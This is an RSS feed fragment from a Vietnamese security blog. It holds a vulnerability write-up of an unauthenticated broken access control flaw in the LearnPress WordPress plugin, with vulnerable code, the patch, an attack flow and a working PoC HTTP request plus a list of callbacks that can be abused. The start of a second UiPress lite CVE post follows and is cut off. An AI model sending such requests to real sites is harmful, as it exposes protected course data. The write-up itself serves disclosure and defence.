&lt;code&gt;get_content&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;permission_callback&lt;/strong&gt;: luôn trả về &lt;code&gt;true&lt;/code&gt;, tức là &lt;strong&gt;không có kiểm tra quyền hạn&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;Sau đó gọi lại &lt;strong&gt;parent::register_routes()&lt;/strong&gt; để hoàn tất việc đăng ký.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function register_routes() {&#xA;  if ( ! $this-&amp;gt;routes ) {&#xA;    return;&#xA;  }&#xA;&#xA;  foreach ( $this-&amp;gt;routes as $key =&amp;gt; $args ) {&#xA;    $rest_base = $this-&amp;gt;rest_base;&#xA;    $override  = false;&#xA;&#xA;    if ( is_bool( end( $args ) ) ) {&#xA;      $override = array_pop( $args );&#xA;    }&#xA;&#xA;    if ( ! is_numeric( $key ) ) {&#xA;      $rest_base = &amp;#34;{$rest_base}/{$key}&amp;#34;;&#xA;    }&#xA;&#xA;    register_rest_route( $this-&amp;gt;namespace, &amp;#39;/&amp;#39; . $rest_base, $args, $override );&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Như vậy, API này có endpoint: &lt;code&gt;/wp-json/lp/v1/load_content_via_ajax&lt;/code&gt;, callback &lt;code&gt;get_content&lt;/code&gt; sẽ được gọi để xử lý request đến.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function get_content( WP_REST_Request $request ): LP_REST_Response {&#xA;  $response = new LP_REST_Response();&#xA;&#xA;  try {&#xA;    $params = $request-&amp;gt;get_params();&#xA;&#xA;    if ( empty( $params[&amp;#39;callback&amp;#39;] ) ||&#xA;      ! isset( $params[&amp;#39;args&amp;#39;] ) ) {&#xA;      throw new Exception( &amp;#39;Error: params invalid!&amp;#39; );&#xA;    }&#xA;&#xA;    // @var array $args&#xA;    $args     = $params[&amp;#39;args&amp;#39;];&#xA;    $callBack = $params[&amp;#39;callback&amp;#39;];&#xA;    if ( $request-&amp;gt;get_method() === &amp;#39;GET&amp;#39; ) {&#xA;      $args     = LP_Helper::json_decode( $params[&amp;#39;args&amp;#39;], true );&#xA;      $callBack = LP_Helper::json_decode( $params[&amp;#39;callback&amp;#39;], true );&#xA;    }&#xA;&#xA;    if ( empty( $callBack[&amp;#39;class&amp;#39;] ) ||&#xA;      empty( $callBack[&amp;#39;method&amp;#39;] ) ) {&#xA;      throw new Exception( &amp;#39;Error: callback invalid!&amp;#39; );&#xA;    }&#xA;&#xA;    $class  = $callBack[&amp;#39;class&amp;#39;];&#xA;    $method = $callBack[&amp;#39;method&amp;#39;];&#xA;    $data   = null;&#xA;&#xA;    // Security: check callback is registered.&#xA;    $allow_callbacks = apply_filters(&#xA;      &amp;#39;lp/rest/ajax/allow_callback&amp;#39;,&#xA;      []&#xA;    );&#xA;    $callBackStr     = $class . &amp;#39;:&amp;#39; . $method;&#xA;    if ( ! in_array( $callBackStr, $allow_callbacks ) ) {&#xA;      throw new Exception( &amp;#39;Error: callback is not register!&amp;#39; );&#xA;    }&#xA;&#xA;    // Check class and method is callable.&#xA;    if ( is_callable( [ $class, $method ] ) ) {&#xA;      $data = call_user_func( [ $class, $method ], $args );&#xA;    } else {&#xA;      throw new Exception( &amp;#39;Error: callback is not callable!&amp;#39; );&#xA;    }&#xA;&#xA;    if ( ! $data instanceof stdClass &amp;amp;&amp;amp; ! isset( $data-&amp;gt;content ) ) {&#xA;      throw new Exception( &amp;#39;Error: data content invalid!&amp;#39; );&#xA;    }&#xA;&#xA;    $response-&amp;gt;status  = &amp;#39;success&amp;#39;;&#xA;    $response-&amp;gt;message = &amp;#39;Success!&amp;#39;;&#xA;    $response-&amp;gt;data    = $data;&#xA;  } catch ( Throwable $e ) {&#xA;    $response-&amp;gt;status  = &amp;#39;error&amp;#39;;&#xA;    $response-&amp;gt;message = $e-&amp;gt;getMessage();&#xA;  }&#xA;&#xA;  return $response;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm nhận &lt;code&gt;callback&lt;/code&gt; và &lt;code&gt;args&lt;/code&gt; từ request, decode JSON nếu là GET, kiểm tra &lt;code&gt;callback&lt;/code&gt; có đủ &lt;code&gt;class&lt;/code&gt; và &lt;code&gt;method&lt;/code&gt;, tạo chuỗi &lt;code&gt;class:method&lt;/code&gt; và đối chiếu với danh sách callback hợp lệ do filter trả về; nếu không có trong danh sách thì báo lỗi, nếu có thì kiểm tra class–method có thể gọi được và thực thi &lt;code&gt;call_user_func&lt;/code&gt; với &lt;code&gt;$args&lt;/code&gt;, nhận về &lt;code&gt;$data&lt;/code&gt; và trả trong response.&lt;/p&gt;&#xA;&lt;p&gt;Hàng loạt các callback được đăng ký cho filter &lt;code&gt;lp/rest/ajax/allow_callback&lt;/code&gt; thông qua hàm &lt;code&gt;add_filter&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-11-cve-2025-11368/filter.png&#34; title=&#34;Đăng ký callback cho filter lp/rest/ajax/allow_callback&#34; data-thumbnail=&#34;/posts/2025-12-11-cve-2025-11368/filter.png&#34; data-sub-html=&#34;&lt;h2&gt;Filter&lt;/h2&gt;&lt;p&gt;Đăng ký callback cho filter lp/rest/ajax/allow_callback&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-11-cve-2025-11368/filter.png&#39; alt=&#34;Filter&#34; height=&#34;948&#34; width=&#34;793&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Đăng ký callback cho filter lp/rest/ajax/allow_callback&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function allow_callback( array $callbacks ): array {&#xA;  $callbacks[] = get_class( $this ) . &amp;#39;:render_edit_quiz&amp;#39;;&#xA;  $callbacks[] = get_class( $this ) . &amp;#39;:render_list_items_not_assign&amp;#39;;&#xA;&#xA;  return $callbacks;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm nhận mảng &lt;code&gt;$callbacks&lt;/code&gt; hiện có, sau đó thêm vào hai chuỗi dạng &lt;code&gt;TênClass:method&lt;/code&gt; của class hiện tại, rồi trả lại mảng đó để WordPress sử dụng làm danh sách callback hợp lệ. Khi debug, ta sẽ thấy toàn bộ các callback được đăng ký:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-11-cve-2025-11368/allow.png&#34; title=&#34;Danh sách các callback hợp lệ&#34; data-thumbnail=&#34;/posts/2025-12-11-cve-2025-11368/allow.png&#34; data-sub-html=&#34;&lt;h2&gt;Allow&lt;/h2&gt;&lt;p&gt;Danh sách các callback hợp lệ&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-11-cve-2025-11368/allow.png&#39; alt=&#34;Allow&#34; height=&#34;869&#34; width=&#34;955&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Danh sách các callback hợp lệ&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Lỗi&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;&lt;strong&gt;Lỗ hổng phát sinh do API không thực hiện bất kỳ kiểm tra quyền (capability/permission) nào.&lt;/strong&gt; Điều này cho phép mọi người dùng – kể cả không có quyền quản trị – gọi vào endpoint và yêu cầu thực thi bất kỳ callback nào nằm trong danh sách callback hợp lệ, dù những callback đó lẽ ra chỉ dành cho admin.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Bản vá (v4.3.0)&lt;/strong&gt; bổ sung vào hàm &lt;code&gt;get_content&lt;/code&gt; bước xác thực quyền bằng cách kiểm tra &lt;code&gt;X-WP-Nonce&lt;/code&gt; gửi kèm request.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! wp_verify_nonce( $request-&amp;gt;get_header( &amp;#39;X-WP-Nonce&amp;#39; ), &amp;#39;wp_rest&amp;#39; ) ) {&#xA;  throw new Exception( &amp;#39;Error: invalid nonce!&amp;#39; );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nếu nonce không hợp lệ hoặc không khớp với action &lt;code&gt;wp_rest&lt;/code&gt;, request sẽ bị chặn ngay, ngăn người dùng không có quyền truy cập vào các callback vốn chỉ dành cho admin.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-11-cve-2025-11368/diff.png&#34; title=&#34;Diff code&#34; data-thumbnail=&#34;/posts/2025-12-11-cve-2025-11368/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Diff code&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-11-cve-2025-11368/diff.png&#39; alt=&#34;Diff&#34; height=&#34;790&#34; width=&#34;1863&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Diff code&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Unauthenticated attacker&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Sends request to REST API: /wp-json/lp/v1/load_content_via_ajax&amp;#34;]&#xA;--&amp;gt; C[&amp;#34;Request includes callback (class &amp;#43; method) and args (lesson, quiz, material IDs...)&amp;#34;]&#xA;--&amp;gt; D[&amp;#34;API receives request → invokes get_content()&amp;#34;]&#xA;--&amp;gt; E[&amp;#34;permission_callback = __return_true → no capability checks&amp;#34;]&#xA;--&amp;gt; F[&amp;#34;get_content() validates params but performs no permission or capability validation&amp;#34;]&#xA;--&amp;gt; G[&amp;#34;Constructs class:method and verifies it against allowed callbacks via lp/rest/ajax/allow_callback&amp;#34;]&#xA;--&amp;gt; H[&amp;#34;Callback is valid but intended for admin-only template rendering&amp;#34;]&#xA;--&amp;gt; I[&amp;#34;API executes the method using call_user_func([class, method], args)&amp;#34;]&#xA;--&amp;gt; J[&amp;#34;Template method renders sensitive HTML such as curriculum, quiz content, answers, or course materials&amp;#34;]&#xA;--&amp;gt; K[&amp;#34;Sensitive data is returned to the attacker through the REST API&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Gửi request với Unauthenticated user:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/lp/v1/load_content_via_ajax HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;callback[class]=LearnPress\TemplateHooks\Admin\AdminEditQizTemplate&amp;amp;callback[method]=render_list_items_not_assign&amp;amp;args[quiz_id]=483&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-11-cve-2025-11368/result.png&#34; title=&#34;Kết quả&#34; data-thumbnail=&#34;/posts/2025-12-11-cve-2025-11368/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Kết quả&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-11-cve-2025-11368/result.png&#39; alt=&#34;Result&#34; height=&#34;807&#34; width=&#34;1315&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Kết quả&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Danh sách các callback hợp lệ khác:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;LearnPress\TemplateHooks\Course\ListCoursesTemplate:render_courses&#xA;LearnPress\TemplateHooks\Course\ListCoursesRelatedTemplate:render_courses&#xA;LearnPress\TemplateHooks\Course\SingleCourseTemplate:render_html_comments&#xA;LearnPress\TemplateHooks\Profile\ProfileQuizzesTemplate:renderContent&#xA;LearnPress\TemplateHooks\Course\AdminEditCurriculumTemplate:render_edit_course_curriculum&#xA;LearnPress\TemplateHooks\Course\AdminEditCurriculumTemplate:render_list_items_not_assign&#xA;LearnPress\TemplateHooks\Admin\AdminEditQizTemplate:render_edit_quiz&#xA;LearnPress\TemplateHooks\Admin\AdminEditQizTemplate:render_list_items_not_assign&#xA;LearnPress\TemplateHooks\Admin\AdminEditQuestionTemplate:render_edit_question&#xA;LearnPress\TemplateHooks\Course\CourseMaterialTemplate:render_material_items&#xA;LearnPress\ExternalPlugin\Elementor\Widgets\Course\Skins\CoursesGrid:render_courses&#xA;LearnPress\ExternalPlugin\Elementor\Widgets\Course\Skins\CoursesList:render_courses&#xA;LearnPress\ExternalPlugin\Elementor\Widgets\Course\Skins\CoursesLoopItem:render_courses&#xA;LearnPress\Gutenberg\Blocks\Courses\ListCoursesBlockType:render_courses&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng xuất phát từ việc endpoint REST API &lt;strong&gt;không kiểm tra quyền truy cập&lt;/strong&gt;, cho phép kẻ tấn công chưa xác thực gọi trực tiếp các callback nội bộ vốn chỉ dành cho admin. Thông qua việc cung cấp ID hợp lệ, attacker có thể truy xuất &lt;strong&gt;curriculum&lt;/strong&gt;, &lt;strong&gt;quiz&lt;/strong&gt;, &lt;strong&gt;đáp án&lt;/strong&gt;, và các &lt;strong&gt;nội dung giáo trình nhạy cảm&lt;/strong&gt;. Bản vá 4.3.0 đã khắc phục bằng cách thêm kiểm tra &lt;strong&gt;X-WP-Nonce&lt;/strong&gt;, ngăn truy cập trái phép vào các callback nhạy cảm.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;permission_callback = __return_true&lt;/strong&gt; là nguyên nhân cốt lõi dẫn đến Broken Access Control.&lt;/li&gt;&#xA;&lt;li&gt;Cho phép gọi callback nội bộ mà không xác thực quyền dẫn đến &lt;strong&gt;lộ dữ liệu nhạy cảm&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Các callback LearnPress được thiết kế cho môi trường admin nhưng lại phơi bày qua API công khai.&lt;/li&gt;&#xA;&lt;li&gt;Biện pháp khắc phục hiệu quả là bổ sung kiểm tra &lt;strong&gt;wp_verify_nonce&lt;/strong&gt; và ràng buộc quyền truy cập.&lt;/li&gt;&#xA;&lt;li&gt;REST API trong WordPress cần luôn có &lt;strong&gt;capability checks&lt;/strong&gt; khi xử lý các hành động quan trọng hoặc nhạy cảm.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/learnpress/vulnerability/wordpress-learnpress-plugin-4-2-9-4-missing-authorization-to-unauthenticated-arbitrary-callback-execution-to-information-exposure-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress LearnPress Plugin &amp;lt;= 4.2.9.4 is vulnerable to Broken Access Control&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-11815 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-10-cve-2025-11815/</link>
      <pubDate>Wed, 10 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-10-cve-2025-11815/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-10-cve-2025-11815/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;UiPress lite&lt;/strong&gt; | &lt;strong&gt;plugin&lt;/strong&gt; tạo &lt;strong&gt;custom dashboards&lt;/strong&gt;, &lt;strong&gt;admin themes&lt;/strong&gt; và &lt;strong&gt;pages&lt;/strong&gt; cho &lt;strong&gt;WordPress&lt;/strong&gt; dễ dàng bị &lt;strong&gt;tấn công&lt;/strong&gt; dẫn đến &lt;strong&gt;sửa đổi dữ liệu trái phép&lt;/strong&gt; do thiếu &lt;strong&gt;kiểm tra capability&lt;/strong&gt; trong &lt;strong&gt;hàm uip_save_site_option()&lt;/strong&gt; ở tất cả các phiên bản cho đến và bao gồm &lt;strong&gt;3.5.08&lt;/strong&gt;. Điều này cho phép &lt;strong&gt;kẻ tấn công đã xác thực&lt;/strong&gt;, với quyền &lt;strong&gt;Subscriber-level&lt;/strong&gt; trở lên, thay đổi tùy ý &lt;strong&gt;cài đặt plugin&lt;/strong&gt;. Các &lt;strong&gt;hành động AJAX&lt;/strong&gt; khác cũng bị ảnh hưởng.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-11815&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-11815&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.5.08&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.5.09&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.4)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Subcriber&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/uipress-lite/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress UiPress lite Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener 